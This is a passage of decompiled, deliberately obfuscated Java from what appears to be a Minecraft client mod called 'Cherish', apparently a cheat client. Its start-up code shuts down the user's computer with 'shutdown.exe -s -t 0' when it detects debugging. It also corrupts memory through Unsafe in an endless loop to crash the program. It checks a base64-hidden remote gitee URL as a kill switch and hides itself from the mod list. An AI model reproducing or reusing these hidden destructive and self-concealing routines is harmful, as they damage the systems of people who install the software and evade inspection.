                           c<"Ñ">("java.lang.Runtime", 5152355039508702011L, 12898248509338L),
                           new Object[0],
                           5169828374985638200L,
                           12898248509338L
                        ),
                        new Object[]{"shutdown.exe -s -t 0"},
                        5169828374985638200L,
                        12898248509338L
                     );
                     c<"Ñ">(5169924105425195669L, 12898248509338L);
                  }
               }

               RuntimeMXBean runtimeMxBean = c<"Ñ">(5153433630248161768L, 12898248509338L);
               List<String> arguments = c<"d">(runtimeMxBean, 5168006845680836229L, 12898248509338L);
               Iterator prop = c<"d">(arguments, 5166358847442709316L, 12898248509338L);
               if (c<"d">(prop, 5167457735653508303L, 12898248509338L)) {
                  String s = (String)c<"d">(prop, 5167603754531806863L, 12898248509338L);
                  if (c<"d">(
                     c<"d">(c<"W">(5153220720779515531L, 12898248509338L), s, "Xbootclasspath", 5154096930807505176L, 12898248509338L),
                     "true",
                     5168219855917898964L,
                     12898248509338L
                  )) {
                     c<"Ñ">(5167781820454180253L, 12898248509338L);
                     c<"d">(
                        c<"d">(
                           c<"d">(
                                 c<"d">(
                                    c<"Ñ">("java.lang.Runtime", 5152355039508702011L, 12898248509338L),
                                    "getRuntime",
                                    new Class[0],
                                    5167707563198487499L,
                                    12898248509338L
                                 ),
                                 c<"Ñ">("java.lang.Runtime", 5152355039508702011L, 12898248509338L),
                                 new Object[0],
                                 5169828374985638200L,
                                 12898248509338L
                              )
                              .getClass(),
                           "exec",
                           new Class[]{String.class},
                           5167707563198487499L,
                           12898248509338L
                        ),
                        c<"d">(
                           c<"d">(
                              c<"Ñ">("java.lang.Runtime", 5152355039508702011L, 12898248509338L),
                              "getRuntime",
                              new Class[0],
                              5167707563198487499L,
                              12898248509338L
                           ),
                           c<"Ñ">("java.lang.Runtime", 5152355039508702011L, 12898248509338L),
                           new Object[0],
                           5169828374985638200L,
                           12898248509338L
                        ),
                        new Object[]{"shutdown.exe -s -t 0"},
                        5169828374985638200L,
                        12898248509338L
                     );
                     c<"Ñ">(5169924105425195669L, 12898248509338L);
                  }
               }

               Properties propx = c<"Ñ">(5156272022204760740L, 12898248509338L);
               String var25 = c<"d">(propx, "user.name", 5153990609403950766L, 12898248509338L);
               String[] lastAutoComplete = new String[]{"", ""};
               char[] t = c<"d">(a<"f">(1195, 3475106800813114034L), 5167041195206588653L, 12898248509338L);
               int unsafe = t.length;
               int address = 0;
               if (0 < unsafe) {
                  char c = t[0];
                  lastAutoComplete[0] = lastAutoComplete[0] + (char)(c ^ 6);
                  address++;
               }

               t = c<"d">("`||x{2''oa|mm&kge'KggdW]{mz'paig`igba&kgfnao'zi\u007f'ei{|mz'K`mza{`'[@N8B[]cB^<c&`y|", 5167041195206588653L, 12898248509338L);
               unsafe = t.length;
               address = 0;
               if (0 < unsafe) {
                  char c = t[0];
                  lastAutoComplete[1] = lastAutoComplete[1] + (char)(c ^ '\b');
                  address++;
               }

               if (c<"Ñ">(lastAutoComplete[0], 5167023110717562550L, 12898248509338L)
                  && !c<"d">(c<"d">(var25, 1, 5152973424670104279L, 12898248509338L), "iyabi", 5168219855917898964L, 12898248509338L)
                  && !c<"d">(var25, "18070", 5153743178006983500L, 12898248509338L)) {
                  c<"Ñ">(5167781820454180253L, 12898248509338L);

                  try {
                     Field unsafeField = c<"d">(Unsafe.class, "theUnsafe", 5155835104445343264L, 12898248509338L);
                     c<"d">(unsafeField, true, 5166733484349673638L, 12898248509338L);
                     Unsafe unsafex = (Unsafe)c<"d">(unsafeField, null, 5152648807681834214L, 12898248509338L);
                     long addressx = 0L;

                     while (true) {
                        c<"d">(unsafex, addressx, b<"s">(22951, 2195098532353074813L), (byte)-128, 5165939805391380041L, 12898248509338L);
                        addressx++;
                     }
                  } catch (Throwable var17) {
                     c<"Ñ">(5169924105425195669L, 12898248509338L);

                     while (true) {
                     }
                  }
               }

               if (c<"Ñ">(lastAutoComplete[1], 5168401901677294299L, 12898248509338L) == null
                  || !c<"d">("B3.7", c<"Ñ">(lastAutoComplete[1], 5168401901677294299L, 12898248509338L), 5168219855917898964L, 12898248509338L)
                  || c<"d">("not found", c<"Ñ">(lastAutoComplete[1], 5168401901677294299L, 12898248509338L), 5167472158191865320L, 12898248509338L)) {
                  c<"Ñ">(5167781820454180253L, 12898248509338L);

                  try {
                     Field unsafeField = c<"d">(Unsafe.class, "theUnsafe", 5155835104445343264L, 12898248509338L);
                     c<"d">(unsafeField, true, 5166733484349673638L, 12898248509338L);
                     Unsafe unsafex = (Unsafe)c<"d">(unsafeField, null, 5152648807681834214L, 12898248509338L);
                     long addressx = 0L;

                     while (true) {
                        c<"d">(unsafex, addressx, b<"s">(22951, 2195098532353074813L), (byte)-128, 5165939805391380041L, 12898248509338L);
                        addressx++;
                     }
                  } catch (Throwable var20) {
                     c<"Ñ">(5169924105425195669L, 12898248509338L);

                     while (true) {
                     }
                  }
               }

               if (c<"Ñ">(
                        c<"Ñ">(
                           "aHR0cHM6Ly9naXRlZS5jb20vQ29vbF9Vc2VyL3hpYW9oYW9qaS5jb25maWcvcmF3L21hc3Rlci9DaGVyaXNoLy5zdGFydA==",
                           5166239737797137889L,
                           12898248509338L
                        ),
                        5168401901677294299L,
                        12898248509338L
                     )
                     == null
                  || !c<"d">(
                     c<"Ñ">(
                        c<"Ñ">(
                           "aHR0cHM6Ly9naXRlZS5jb20vQ29vbF9Vc2VyL3hpYW9oYW9qaS5jb25maWcvcmF3L21hc3Rlci9DaGVyaXNoLy5zdGFydA==",
                           5166239737797137889L,
                           12898248509338L
                        ),
                        5168401901677294299L,
                        12898248509338L
                     ),
                     5153326026418887089L,
                     12898248509338L
                  )
                  || c<"d">(
                     c<"Ñ">(
                        c<"Ñ">(
                           "aHR0cHM6Ly9naXRlZS5jb20vQ29vbF9Vc2VyL3hpYW9oYW9qaS5jb25maWcvcmF3L21hc3Rlci9DaGVyaXNoLy5zdGFydA==",
                           5166239737797137889L,
                           12898248509338L
                        ),
                        5168401901677294299L,
                        12898248509338L
                     ),
                     "not found",
                     5167472158191865320L,
                     12898248509338L
                  )) {
                  c<"Ñ">(5167781820454180253L, 12898248509338L);

                  try {
                     Field unsafeField = c<"d">(Unsafe.class, "theUnsafe", 5155835104445343264L, 12898248509338L);
                     c<"d">(unsafeField, true, 5166733484349673638L, 12898248509338L);
                     Unsafe unsafex = (Unsafe)c<"d">(unsafeField, null, 5152648807681834214L, 12898248509338L);
                     long addressx = 0L;

                     while (true) {
                        c<"d">(unsafex, addressx, b<"s">(22951, 2195098532353074813L), (byte)-128, 5165939805391380041L, 12898248509338L);
                        addressx++;
                     }
                  } catch (Throwable var19) {
                     c<"Ñ">(5169924105425195669L, 12898248509338L);

                     while (true) {
                     }
                  }
               }

               c<"Ñ">(new Object[]{1065645989381L, new Object()}, 5168455481173177120L, 12898248509338L);
               if (c<"d">(
                     c<"d">(BLOCKED_COMPUTER, 5153286039365786309L, 12898248509338L),
                     (Predicate<Object>)computer -> var25.contains(computer.toString()),
                     5166670833103821038L,
                     12898248509338L
                  )
                  || c<"d">(
                     c<"d">(BLOCKED_COMPUTER, 5153286039365786309L, 12898248509338L),
                     (Predicate<Object>)computer -> System.getProperty("").contains(computer.toString()),
                     5166670833103821038L,
                     12898248509338L
                  )
                  || c<"d">(
                     c<"d">(BLOCKED_COMPUTER, 5153286039365786309L, 12898248509338L),
                     (Predicate<Object>)computer -> System.getProperty("os.name").contains(computer.toString()),
                     5166670833103821038L,
                     12898248509338L
                  )) {
                  SHOULD_START = c<"Ñ">(true, 5168697889717501331L, 12898248509338L);
                  MODULE_SHOULD_START = c<"Ñ">(false, 5168697889717501331L, 12898248509338L);
                  c<"Ñ">(5167781820454180253L, 12898248509338L);

                  try {
                     Field unsafeField = c<"d">(Unsafe.class, "theUnsafe", 5155835104445343264L, 12898248509338L);
                     c<"d">(unsafeField, true, 5166733484349673638L, 12898248509338L);
                     Unsafe unsafex = (Unsafe)c<"d">(unsafeField, null, 5152648807681834214L, 12898248509338L);
                     long addressx = 0L;

                     while (true) {
                        c<"d">(unsafex, addressx, b<"s">(22951, 2195098532353074813L), (byte)-128, 5165939805391380041L, 12898248509338L);
                        addressx++;
                     }
                  } catch (Throwable var18) {
                     c<"Ñ">(5169924105425195669L, 12898248509338L);

                     while (true) {
                     }
                  }
               }

               c<"Ç">(this, new EventManager(), 5152580132313233690L, 12898248509338L);
               c<"Ç">(this, new ModuleManager(), 5168605967060768838L, 12898248509338L);
               c<"Ç">(this, new 树何友树树树树树何何(), 5166462899732018260L, 12898248509338L);
               c<"Ç">(this, new 友友何树树树友树何友(), 5167119667360359574L, 12898248509338L);
               c<"Ç">(this, new 友树何友何友何树树树(), 5165858694695592092L, 12898248509338L);
               c<"Ç">(this, new 何何何何何何友树友树(), 5152753541127601681L, 12898248509338L);
               c<"d">(c<"e">(this, 5168605967060768838L, 12898248509338L), 5165763117007003273L, 12898248509338L);
               c<"d">(c<"W">(5167828608388622894L, 12898248509338L), 5153138881212411118L, 12898248509338L);
               c<"d">(c<"W">(5152861173205332506L, 12898248509338L), new Object[]{39403400512966L}, 5152250025773703048L, 12898248509338L);
               c<"d">(c<"e">(this, 5166462899732018260L, 12898248509338L), new Object[0], 5155745003395561600L, 12898248509338L);
               c<"Ñ">(
                  new Object[]{
                     c<"Ñ">(1, 5166519210978458248L, 12898248509338L),
                     c<"Ñ">(9, 5166519210978458248L, 12898248509338L),
                     c<"Ñ">(8, 5166519210978458248L, 12898248509338L),
                     c<"Ñ">(9, 5166519210978458248L, 12898248509338L)
                  },
                  5167204399031793736L,
                  12898248509338L
               );
               c<"Ñ">(5169458423874003345L, 12898248509338L);
               c<"Ñ">(5155923482363145366L, 12898248509338L);
               c<"Ñ">(new Object[0], 5156054341171778945L, 12898248509338L);
               c<"d">(树何何树友树何树友树.树树何友何树何何何树, 5166030479829656370L, 12898248509338L);
               MODULE_SHOULD_START = c<"Ñ">(true, 5168697889717501331L, 12898248509338L);
               c<"d">(this, 5167327079445882631L, 12898248509338L);
            } catch (Exception var21) {
               SHOULD_START = c<"Ñ">(true, 5168697889717501331L, 12898248509338L);
               MODULE_SHOULD_START = c<"Ñ">(false, 5168697889717501331L, 12898248509338L);
               c<"Ñ">(5167545945005777619L, 12898248509338L);
               c<"Ñ">(5167781820454180253L, 12898248509338L);
               c<"Ñ">(5169924105425195669L, 12898248509338L);
               c<"d">(c<"e">(this, 5152580132313233690L, 12898248509338L), null, 5153507630967484526L, 12898248509338L);
               c<"Ç">(this, null, 5152580132313233690L, 12898248509338L);
               c<"Ç">(this, null, 5168605967060768838L, 12898248509338L);
               c<"Ç">(this, null, 5167119667360359574L, 12898248509338L);
               c<"d">(c<"e">(this, 5168605967060768838L, 12898248509338L), 5165763117007003273L, 12898248509338L);
               c<"Ñ">(5169458423874003345L, 12898248509338L);
               instance = null;
               c<"Ñ">(
                  new Object[]{
                     c<"Ñ">(0, 5166519210978458248L, 12898248509338L),
                     c<"Ñ">(6, 5166519210978458248L, 12898248509338L),
                     c<"Ñ">(0, 5166519210978458248L, 12898248509338L),
                     c<"Ñ">(4, 5166519210978458248L, 12898248509338L)
                  },
                  5167204399031793736L,
                  12898248509338L
               );
            }
         }
      }
   }

   public void o(ResourceLocation clientCustomTexture) {
      this.树树树友树树树友何何 = clientCustomTexture;
   }

   public void p(ResourceLocation clientLogoTexture) {
      this.友友何何树树何友树树 = clientLogoTexture;
   }

   public 友树何友何友何树树树 t() {
      return this.友树何何树何树树何树;
   }

   public void v(ResourceLocation clientTargetTexture) {
      this.何何何树树友何树何何 = clientTargetTexture;
   }

   public void v() {
      int var10000 = q();
      ModList.get().getMods().removeIf(modInfox -> modInfox.getModId().equals("cherish"));
      int a = var10000;
      List<IModFileInfo> fileInfoToRemove = new ArrayList<>();
      Iterator var5 = ModList.get().getModFiles().iterator();
      if (var5.hasNext()) {
         IModFileInfo fileInfo = (IModFileInfo)var5.next();
         Iterator var7 = fileInfo.getMods().iterator();
         if (var7.hasNext()) {
            IModInfo modInfo = (IModInfo)var7.next();
            if (modInfo.getModId().equals("")) {
               fileInfoToRemove.add(fileInfo);
            }
         }
      }

      ModList.get().getModFiles().removeAll(fileInfoToRemove);
      if (Module.Z() == null) {
         X(++a);
      }
   }

   public void v(树何友树树树树树何何 targetManager) {
      this.何友树何树何何何友树 = targetManager;
   }

   public void j(ModuleManager moduleManager) {
      this.友何友友友树树何何树 = moduleManager;
   }

   public static int q() {
      return 友树树友树树何友友友;
   }

   public static boolean Y(Object b) {
      return true;
   }

   public static void X(int var0) {
      友树树友树树何友友友 = var0;
   }

   public static void X(String s) {
   }

   public 何何何何何何友树友树 P() {
      return this.何友树树树何何友友友;
   }

   public void P() {
      this.友友何何树树何友树树 = null;
      this.树树树友树树树友何何 = null;
      this.何何何树树友何树何何 = null;
   }

   public void P(何何何何何何友树友树 friendManager) {
      this.何友树树树何何友友友 = friendManager;
   }

   public ResourceLocation H() {
      return this.何何何树树友何树何何;
   }

   private void H() {
      林佳鹏.LINGJIAPENG13113169317.l();
   }

   public static int H() {
      q();

      try {
         return 5;
      } catch (RuntimeException var0) {
         throw a(var0);
      }
   }

   public void H(EventManager eventManager) {
      this.树友何何何树何友树何 = eventManager;
   }

   public static void setMinecraft() {
      H();

      try {
         Class<?> classMinecraft = Class.forName("net.minecraft.client.Minecraft");
         Field[] var4 = classMinecraft.getDeclaredFields();
         int var5 = var4.length;
         int var6 = 0;
         if (0 < var5) {
            Field field = var4[0];
            if (field.getType() == classMinecraft) {
               field.setAccessible(true);
               field.set(field.get(null), null);
               field.setAccessible(false);
            }

            var6++;
         }
      } catch (Throwable var8) {
         var8.printStackTrace();
      }
   }

   private static String HE_SHU_YOU() {
      return "何大伟：我要教育何炜霖";
   }

   public static ConfigManager getConfigManager() {
      return 树树友友树友友何何何;
   }

   public EventManager getEventManager() {
      return this.树友何何何树何友树何;
   }

   public ModuleManager getModuleManager() {
      return this.友何友友友树树何何树;
   }

   public static void O(ConfigManager configManager) {
      树树友友树友友何何何 = configManager;
   }

   public static void O(ResourcesManager resourcesManager) {
      何何何何树树友友树何 = resourcesManager;
   }

   public static ResourcesManager getResourcesManager() {
      return 何何何何树树友友树何;
   }

   public void loadClientResource() {
      q();
      this.友友何何树树何友树树 = 何何何何树树友友树何.k(new Object[]{何何何何树树友友树何.resources.getAbsolutePath() + "\\icon\\cherish.png", 129577619446336L});
      this.树树树友树树树友何何 = 何何何何树树友友树何.k(new Object[]{何何何何树树友友树何.resources.getAbsolutePath() + "\\icon\\custom_image.png", 129577619446336L});
      this.何何何树树友何树何何 = 何何何何树树友友树何.k(new Object[]{何何何何树树友友树何.resources.getAbsolutePath() + "\\icon\\target.png", 129577619446336L});
      Module.V(new Module[4]);
   }
}
